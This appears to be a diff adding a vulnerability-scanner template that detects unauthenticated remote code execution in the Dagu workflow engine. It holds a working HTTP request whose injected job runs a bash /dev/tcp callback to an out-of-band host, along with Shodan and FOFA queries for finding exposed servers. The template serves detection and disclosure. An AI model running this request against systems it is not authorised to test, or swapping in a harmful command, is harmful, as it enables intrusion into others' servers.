@@ -1,0 +1,72 @@
+id: dagu-rce
+
+info:
+  name: Dagu Workflow Engine - Unauthenticated Remote Code Execution
+  author: omarkurt
+  severity: critical
+  description: |
+    Dagu (<= 1.30.3) ships with authentication disabled by default (GHSA-6qr9-g2xw-cw92).
+    The POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and
+    immediately executes shell commands without credentials. Three issues were identified:
+    unauthenticated RCE, operator privilege escalation, and backtick command injection.
+  reference:
+    - https://github.com/advisories/GHSA-6qr9-g2xw-cw92
+    - https://github.com/dagu-org/dagu
+    - https://vulnerabletarget.com/vt-dagu
+  remediation: |
+    Enable authentication by setting DAGU_AUTH_MODE=builtin and configuring credentials.
+    Do not expose Dagu to the internet without authentication.
+    Upgrade to a patched version when available.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-306
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: dagu-org
+    product: dagu
+    ghsa: GHSA-6qr9-g2xw-cw92
+    shodan-query:
+      - 'title:"Dagu"'
+    fofa-query:
+      - 'title="Dagu"'
+  tags: ghsa,rce,unauth,dagu,workflow,critical,missing-auth,oob
+
+variables:
+  marker: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  # OOB RCE: inline DAG spec triggers /dev/tcp connection → interactsh callback proves RCE
+  - raw:
+      - |
+        POST /api/v2/dag-runs HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"vt-{{marker}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "dagRunId"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        part: body
+        name: dag_run_id
+        json:
+          - ".dagRunId"
